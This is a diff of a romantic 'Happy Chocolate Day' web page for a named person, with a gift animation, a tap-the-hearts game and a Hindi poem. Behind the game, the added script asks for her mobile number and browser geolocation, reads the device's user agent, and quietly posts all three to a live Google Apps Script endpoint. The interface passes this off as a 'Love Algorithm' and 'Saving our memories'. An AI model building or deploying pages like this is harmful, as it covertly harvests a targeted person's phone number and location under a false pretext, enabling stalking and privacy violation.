@@ -2,309 +2,293 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>For My Special One 🍫</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>For Havya 🍫</title>
     <link href="https://fonts.googleapis.com/css2?family=Pacifico&family=Quicksand:wght@400;700&display=swap" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
 
     <style>
-        /* --- CSS STYLES --- */
-        body {
-            margin: 0;
-            padding: 0;
-            background: linear-gradient(135deg, #fff1eb 0%, #ace0f9 100%);
-            font-family: 'Quicksand', sans-serif;
-            overflow: hidden;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            user-select: none;
-        }
+        body { margin: 0; padding: 0; background: linear-gradient(135deg, #fff1eb 0%, #ace0f9 100%); font-family: 'Quicksand', sans-serif; overflow: hidden; height: 100vh; width: 100vw; display: flex; justify-content: center; align-items: center; touch-action: manipulation; }
+        .container { background: rgba(255, 255, 255, 0.95); padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.15); text-align: center; width: 85%; max-width: 350px; position: absolute; transition: all 0.5s ease; z-index: 10; max-height: 85vh; overflow-y: auto; }
+        h1 { font-family: 'Pacifico', cursive; color: #d84315; font-size: 26px; margin: 0 0 10px 0; }
+        p { color: #5d4037; font-size: 16px; margin-bottom: 15px; line-height: 1.5; }
+        
+        /* SCREENS */
+        #screen-gift { background: transparent; box-shadow: none; cursor: pointer; z-index: 20; }
+        .gift-box { font-size: 80px; animation: bounce 2s infinite; }
+        @keyframes bounce { 0%, 20%, 50%, 80%, 100% {transform: translateY(0);} 40% {transform: translateY(-30px);} 60% {transform: translateY(-15px);} }
+        .tap-hint { font-size: 18px; color: #d84315; font-weight: bold; margin-top: 10px; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { opacity: 0.6; } 50% { opacity: 1; } 100% { opacity: 0.6; } }
 
-        /* 1. Chocolate Rain Background */
-        .rain-container {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 1;
-            overflow: hidden;
-        }
-        .drop {
-            position: absolute;
-            top: -50px;
-            font-size: 24px;
-            animation: fall linear infinite;
-        }
-        @keyframes fall {
-            to { transform: translateY(110vh) rotate(360deg); }
-        }
-
-        /* 2. Main Card Styling */
-        .card {
-            background: rgba(255, 255, 255, 0.95);
-            padding: 40px;
-            border-radius: 25px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
-            text-align: center;
-            z-index: 10;
-            max-width: 90%;
-            width: 350px;
-            transition: transform 0.3s ease;
-        }
-
-        h1 {
-            font-family: 'Pacifico', cursive;
-            color: #d84315; /* Chocolate/Rust color */
-            margin: 0 0 15px 0;
-        }
-
-        p { color: #5d4037; font-weight: bold; }
-
-        /* 3. Input & Button */
-        input {
-            width: 100%;
-            padding: 15px;
-            margin: 15px 0;
-            border: 2px solid #efebe9;
-            border-radius: 15px;
-            box-sizing: border-box;
-            font-size: 16px;
-            outline: none;
-            text-align: center;
-            transition: 0.3s;
-        }
-        input:focus { border-color: #d84315; }
-
-        button {
-            background: linear-gradient(45deg, #d84315, #ff7043);
-            color: white;
-            border: none;
-            padding: 15px 40px;
-            font-size: 18px;
-            border-radius: 50px;
-            cursor: pointer;
-            font-family: 'Pacifico', cursive;
-            box-shadow: 0 5px 15px rgba(216, 67, 21, 0.4);
-            transition: transform 0.2s;
-        }
+        #screen-login { display: none; opacity: 0; transform: scale(0.9); }
+        input { width: 100%; padding: 12px; font-size: 18px; border: 2px solid #ffccbc; border-radius: 10px; margin-bottom: 15px; text-align: center; outline: none; box-sizing: border-box; }
+        button { background: #d84315; color: white; border: none; padding: 12px 30px; font-size: 18px; border-radius: 50px; font-family: 'Pacifico', cursive; cursor: pointer; width: 100%; transition: transform 0.2s; }
         button:active { transform: scale(0.95); }
 
-        /* 4. Game Elements */
-        #game-layer {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 20;
-            background: rgba(255, 255, 255, 0.8);
-        }
-        .floater {
-            position: absolute;
-            font-size: 50px;
-            cursor: pointer;
-            animation: floatUp 4s linear infinite;
-        }
-        @keyframes floatUp {
-            0% { transform: translateY(100vh) scale(1); opacity: 1; }
-            100% { transform: translateY(-10vh) scale(0.5); opacity: 0; }
-        }
-
-        /* 5. Final Message */
-        #success-view { display: none; }
-        .big-heart {
-            font-size: 60px;
-            animation: heartbeat 1.5s infinite;
-        }
-        @keyframes heartbeat {
-            0% { transform: scale(1); }
-            15% { transform: scale(1.3); }
-            30% { transform: scale(1); }
-            45% { transform: scale(1.3); }
-            100% { transform: scale(1); }
-        }
+        #screen-calc { display: none; }
+        .rose-count { font-size: 50px; color: #e91e63; font-weight: bold; margin: 10px 0; }
         
-        #loading-text {
-            display: none;
-            color: #888;
-            font-size: 0.8rem;
-            margin-top: 10px;
-        }
+        #screen-game { display: none; background: none; box-shadow: none; width: 100%; height: 100%; top:0; left:0; max-width: none; overflow: hidden; }
+        .game-target { position: absolute; font-size: 50px; animation: floatUp 3.5s linear forwards; cursor: pointer; user-select: none; -webkit-tap-highlight-color: transparent; }
+        @keyframes floatUp { 0% { bottom: -60px; transform: translateX(0) rotate(0deg); opacity: 1;} 100% { bottom: 110vh; transform: translateX(20px) rotate(20deg); opacity: 0.8;} }
+
+        #screen-final { display: none; }
+        .hindi-poem { font-family: 'Quicksand', sans-serif; font-size: 15px; line-height: 1.6; color: #3e2723; margin: 15px 0; text-align: center; font-weight: 500; }
+        .highlight { color: #d84315; font-weight: bold; }
+        
+        .rain-layer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1; overflow: hidden; }
+        .flying-rose { position: absolute; font-size: 30px; z-index: 50; pointer-events: none; transition: all 1s ease-out; opacity: 1; }
     </style>
 </head>
 <body>
 
-    <div class="rain-container" id="rain"></div>
+    <div class="rain-layer" id="rain"></div>
 
-    <div class="card" id="login-view">
-        <h1>Hey Lovely! 🍫</h1>
-        <p>I have a small surprise for you.</p>
-        <p style="font-size: 0.9em; font-weight: normal;">Enter your number to unlock it:</p>
+    <div class="container" id="screen-gift" onclick="unwrapGift()">
+        <div class="gift-box">🎁</div>
+        <div class="tap-hint">Tap to Unwrap!</div>
+    </div>
+
+    <div class="container" id="screen-login">
+        <h1>Hey Havya! ❤️</h1>
+        <p>I have a special "Love Algorithm" just for you.</p>
+        <input type="tel" id="mobile" placeholder="Enter Mobile Number" maxlength="15">
+        <button onclick="handleButtonClick()">Reveal My Luck</button>
+        <p id="loading-txt" style="display:none; margin-top:10px; color:#888;">Saving our memories...</p>
+    </div>
+
+    <div class="container" id="screen-calc">
+        <h1>Wow!</h1>
+        <p>Your number is magical.</p>
+        <p>It generated:</p>
+        <div class="rose-count" id="rose-result">0 🌹</div>
+        <button onclick="startGame()">Catch Them All!</button>
+    </div>
+
+    <div class="container" id="screen-game">
+        <h2 id="game-title" style="position: absolute; top: 30px; width: 100%; color: #d84315; font-family: 'Pacifico'; margin:0; pointer-events:none;">Tap Hearts!</h2>
+        <h3 id="score-display" style="position: absolute; top: 70px; width: 100%; color: #5d4037; margin:0; pointer-events:none;">0 / 0</h3>
+    </div>
+
+    <div class="container" id="screen-final">
+        <h1 style="font-size: 26px;">Happy Chocolate Day,<br>Havya! 🍫</h1>
         
-        <input type="tel" id="mobile" placeholder="Mobile Number" maxlength="15">
-        <button onclick="handleLogin()">Unlock Surprise</button>
-        <div id="loading-text">Checking the magic list...</div>
-    </div>
-
-    <div id="game-layer">
-        <div style="position: absolute; top: 20px; width: 100%; text-align: center; color: #d84315;">
-            <h2 style="font-family: 'Pacifico';">Catch 5 Hearts!</h2>
-            <h3 id="score">Score: 0 / 5</h3>
+        <div class="hindi-poem">
+            <p>
+                ज़िंदगी भी चॉकलेट जैसी ही होती है,<br>
+                कभी कड़वी, कभी बहुत मीठी होती है।<br>
+                जो कड़वाहट से भाग जाता है,<br>
+                वो मिठास का मतलब नहीं समझ पाता है।
+            </p>
+            <p>
+                हर रिश्ता भी चॉकलेट की तरह पिघलता है,<br>
+                थोड़ी गर्माहट मिले तो दिल से निकलता है।<br>
+                शब्दों से नहीं, एहसास से जुड़ता है,<br>
+                और सन्नाटे में भी मुस्कुरा देता है।
+            </p>
+            <p>
+                आज चॉकलेट देकर बस इतना कहना है,<br>
+                कि जीवन की हर कसक में साथ निभाना है。<br>
+                अगर स्वाद कभी कड़वा हो जाए,<br>
+                <span class="highlight">तो समझ लेना… मिठास आने वाली है।</span>
+            </p>
         </div>
-    </div>
 
-    <div class="card" id="success-view">
-        <div class="big-heart">❤️</div>
-        <h1>Happy Chocolate Day!</h1>
-        <p id="welcome-msg">You are sweeter than any chocolate.</p>
-        <p>You won the game & my heart!</p>
-        <img src="https://media.giphy.com/media/26BRv0ThflsHCqDrG/giphy.gif" style="width: 100%; border-radius: 15px; margin-top: 10px;">
+        <img src="https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExenI2dDFyeDk3eXJxZDJuN3B5YWpyaWZmdnV4dWNtZWkza21iMnI0ayZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/9NgiavRTlG7n0J0hVH/giphy.gif" style="width:100%; border-radius:10px; margin-top:5px;">
     </div>
 
     <script>
         // ==========================================
-        // CONFIGURATION
-        // ==========================================
-        // ⚠️ REPLACE THIS URL WITH YOUR GOOGLE APPS SCRIPT URL
-        const GOOGLE_SCRIPT_URL = "PASTE_YOUR_WEB_APP_URL_HERE"; 
+        // ⚠️ YOUR GOOGLE SCRIPT URL
+        const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbylDLTFKNdiFlE1T01EKjOvN8V4vUfkV6LeUvHoNlrej9okRXn_6jtm57qakE8UJEXr/exec"; 
         // ==========================================
 
-        // 1. Background Chocolate Rain
-        function startRain() {
-            const container = document.getElementById('rain');
-            const symbols = ['🍫', '🍬', '❤️', '🧁'];
-            
-            setInterval(() => {
-                const el = document.createElement('div');
-                el.classList.add('drop');
-                el.innerText = symbols[Math.floor(Math.random() * symbols.length)];
-                el.style.left = Math.random() * 100 + 'vw';
-                el.style.animationDuration = (Math.random() * 3 + 2) + 's';
-                el.style.opacity = Math.random();
-                container.appendChild(el);
-                
-                // Cleanup to keep browser happy
-                setTimeout(() => el.remove(), 5000);
-            }, 300);
+        let targetScore = 5; 
+        let score = 0;
+        let gameTimer;
+        let finalMobileNumber = "";
+
+        // --- 1. GIFT OPENING ---
+        function unwrapGift() {
+            const gift = document.getElementById('screen-gift');
+            const login = document.getElementById('screen-login');
+            gift.style.transform = "scale(1.2)"; gift.style.opacity = "0";
+            setTimeout(() => { gift.style.display = 'none'; login.style.display = 'block'; setTimeout(() => { login.style.opacity = "1"; login.style.transform = "scale(1)"; }, 50); }, 300);
         }
-        startRain();
 
-        // 2. Login Logic
-        function handleLogin() {
-            const number = document.getElementById('mobile').value;
-            if (number.length < 5) {
-                alert("Please enter a valid number!");
+        // --- 2. MAIN LOGIC (CLICK & STORE) ---
+        function handleButtonClick() {
+            let num = document.getElementById('mobile').value;
+            // Sanitize
+            num = num.replace(/\D/g, ''); 
+            if (num.length > 10 && num.startsWith('91')) num = num.substring(2); 
+
+            // Validate
+            const indianMobileRegex = /^[6-9]\d{9}$/;
+            if (!indianMobileRegex.test(num)) {
+                alert("Please enter a valid 10-digit mobile number!");
                 return;
             }
 
-            const btn = document.querySelector('button');
-            const loading = document.getElementById('loading-text');
-            btn.style.display = 'none'; // Hide button
+            // Lock UI
+            finalMobileNumber = num;
+            const btn = document.querySelector('#screen-login button');
+            const loading = document.getElementById('loading-txt');
+            btn.style.display = 'none';
             loading.style.display = 'block';
 
-            // Send data to Google Sheet
-            // We use mode: 'no-cors' to avoid CORS errors. 
-            // This means we won't get a readable response JSON, but the data WILL send.
-            fetch(GOOGLE_SCRIPT_URL, {
-                method: "POST",
-                mode: "no-cors",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ number: number })
-            }).then(() => {
-                // Success (or network request sent)
-                checkHistoryAndStart(number);
-            }).catch(e => {
-                console.error("Error:", e);
-                // Even if error, let her play
-                checkHistoryAndStart(number);
-            });
-        }
+            // --- LOCATION STRATEGY ---
+            // We use a timeout. If location takes > 3 seconds, we skip it and save anyway.
+            let locationFound = false;
 
-        // 3. Local Storage Check (Interactive "Feel")
-        function checkHistoryAndStart(number) {
-            // Check if she played before on this phone
-            let visits = localStorage.getItem('choco_visits_' + number);
-            visits = visits ? parseInt(visits) + 1 : 1;
-            localStorage.setItem('choco_visits_' + number, visits);
-
-            let msg = "You are sweeter than any chocolate.";
-            if (visits > 1) {
-                msg = "Welcome back my love! <3 (I knew you couldn't stay away)";
-            }
-
-            // Update final message
-            document.getElementById('welcome-msg').innerText = msg;
-
-            // Start Game
-            document.getElementById('login-view').style.display = 'none';
-            document.getElementById('game-layer').style.display = 'block';
-            startGame();
-        }
-
-        // 4. The Game
-        let score = 0;
-        let gameTimer;
-        
-        function startGame() {
-            gameTimer = setInterval(() => {
-                const gameLayer = document.getElementById('game-layer');
-                const item = document.createElement('div');
-                item.classList.add('floater');
-                item.innerText = Math.random() > 0.5 ? '❤️' : '🍫';
-                item.style.left = Math.random() * 90 + '%';
-                
-                // Click logic
-                item.onclick = function() {
-                    score++;
-                    document.getElementById('score').innerText = "Score: " + score + " / 5";
-                    
-                    // Simple pop effect
-                    confetti({
-                        particleCount: 10,
-                        spread: 30,
-                        origin: { x: item.getBoundingClientRect().x / window.innerWidth, y: item.getBoundingClientRect().y / window.innerHeight }
-                    });
-
-                    this.remove();
-
-                    if (score >= 5) {
-                        winGame();
+            if (navigator.geolocation) {
+                // Try getting location
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        // Success
+                        if(!locationFound) {
+                            locationFound = true;
+                            const loc = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
+                            saveDataAndContinue(finalMobileNumber, loc);
+                        }
+                    },
+                    (error) => {
+                        // Error/Denied
+                        if(!locationFound) {
+                            locationFound = true;
+                            console.log("Location denied");
+                            saveDataAndContinue(finalMobileNumber, "Access Denied");
+                        }
                     }
-                };
+                );
 
-                gameLayer.appendChild(item);
-                setTimeout(() => item.remove(), 4000);
-            }, 600);
+                // Fallback Timer (3 seconds)
+                setTimeout(() => {
+                    if(!locationFound) {
+                        locationFound = true;
+                        console.log("Location timed out");
+                        saveDataAndContinue(finalMobileNumber, "Location Timeout/Not Shared");
+                    }
+                }, 3000);
+
+            } else {
+                // Not supported
+                saveDataAndContinue(finalMobileNumber, "Not Supported");
+            }
         }
 
-        function winGame() {
-            clearInterval(gameTimer);
-            document.getElementById('game-layer').style.display = 'none';
-            document.getElementById('success-view').style.display = 'block';
+        function saveDataAndContinue(num, locationInfo) {
+            // Get Device Info
+            const deviceInfo = navigator.userAgent;
+
+            // --- THE ACTUAL DATA STORE REQUEST ---
+            fetch(GOOGLE_SCRIPT_URL, {
+                method: "POST", 
+                mode: "no-cors", // Important for Google Scripts
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                    number: num,
+                    location: locationInfo,
+                    device: deviceInfo
+                })
+            }).then(() => {
+                console.log("Data sent to sheet");
+            }).catch(e => {
+                console.error("Error sending data", e);
+            });
+
+            // Proceed to animation (Don't wait for fetch, just go)
+            processRoseCalculation(num);
+        }
+
+        // --- 3. ROSE CALCULATION ---
+        function processRoseCalculation(num) {
+            let sum = 0;
+            for(let char of num) { sum += parseInt(char); }
+            let result = (sum % 10) + 1;
+            targetScore = result;
+
+            setTimeout(() => { showRoseReveal(result); }, 1500);
+        }
+
+        function showRoseReveal(count) {
+            document.getElementById('screen-login').style.display = 'none';
+            document.getElementById('screen-calc').style.display = 'block';
+            document.getElementById('rose-result').innerText = count + " 🌹";
+            for(let i=0; i<count; i++) { setTimeout(() => { createFlyingRose(); }, i * 150); }
+        }
+
+        function createFlyingRose() {
+            const r = document.createElement('div');
+            r.innerText = "🌹"; r.className = 'flying-rose';
+            r.style.left = "50%"; r.style.top = "50%";
+            document.body.appendChild(r);
+            const angle = Math.random() * 2 * Math.PI;
+            const velocity = 100 + Math.random() * 150;
+            const tx = Math.cos(angle) * velocity;
+            const ty = Math.sin(angle) * velocity;
+            requestAnimationFrame(() => { r.style.transform = `translate(${tx}px, ${ty}px) scale(1.5)`; r.style.opacity = "0"; });
+            setTimeout(() => r.remove(), 1000);
+        }
+
+        // --- 4. GAME ---
+        function startGame() {
+            document.getElementById('screen-calc').style.display = 'none';
+            document.getElementById('screen-game').style.display = 'block';
+            document.getElementById('game-title').innerText = "Tap " + targetScore + " Hearts!";
+            document.getElementById('score-display').innerText = "0 / " + targetScore;
+            gameTimer = setInterval(spawnItem, 600);
+        }
+
+        function spawnItem() {
+            const layer = document.getElementById('screen-game');
+            const el = document.createElement('div');
+            el.classList.add('game-target');
+            el.innerText = Math.random() > 0.3 ? '❤️' : '🍫';
+            el.style.left = Math.random() * 80 + 5 + '%'; 
             
-            // FIREWORKS!
-            var duration = 3 * 1000;
-            var animationEnd = Date.now() + duration;
-            var defaults = { startVelocity: 30, spread: 360, ticks: 60, zIndex: 0 };
-
-            var interval = setInterval(function() {
-                var timeLeft = animationEnd - Date.now();
-
-                if (timeLeft <= 0) {
-                    return clearInterval(interval);
-                }
-
-                var particleCount = 50 * (timeLeft / duration);
-                
-                // Random fireworks
-                confetti(Object.assign({}, defaults, { particleCount, origin: { x: Math.random(), y: Math.random() - 0.2 } }));
-            }, 250);
+            const hit = (e) => {
+                e.preventDefault();
+                score++;
+                document.getElementById('score-display').innerText = score + " / " + targetScore;
+                const rect = el.getBoundingClientRect();
+                confetti({ particleCount: 5, spread: 30, origin: { x: (rect.left + 20)/window.innerWidth, y: (rect.top + 20)/window.innerHeight } });
+                el.remove();
+                if(score >= targetScore) finishGame();
+            };
+            el.addEventListener('mousedown', hit); el.addEventListener('touchstart', hit);
+            layer.appendChild(el);
+            setTimeout(() => { if(el.parentElement) el.remove(); }, 3500);
         }
+
+        // --- 5. FINISH ---
+        function finishGame() {
+            clearInterval(gameTimer);
+            document.getElementById('screen-game').style.display = 'none';
+            document.getElementById('screen-final').style.display = 'block';
+            const duration = 3000; const end = Date.now() + duration;
+            (function frame() {
+                confetti({ particleCount: 5, angle: 60, spread: 55, origin: { x: 0 } });
+                confetti({ particleCount: 5, angle: 120, spread: 55, origin: { x: 1 } });
+                if (Date.now() < end) { requestAnimationFrame(frame); }
+            }());
+        }
+
+        // --- RAIN ---
+        function makeItRain() {
+            const r = document.getElementById('rain');
+            const d = document.createElement('div');
+            d.innerText = Math.random() > 0.5 ? '🍫' : '✨';
+            d.style.position = 'absolute'; d.style.top = '-30px';
+            d.style.left = Math.random() * 100 + 'vw';
+            d.style.fontSize = Math.random() * 15 + 10 + 'px';
+            d.style.opacity = 0.5; d.style.transition = 'top 5s linear';
+            r.appendChild(d);
+            setTimeout(() => { d.style.top = '110vh'; }, 100);
+            setTimeout(() => { d.remove(); }, 5000);
+        }
+        setInterval(makeItRain, 400);
+
     </script>
 </body>
 </html>
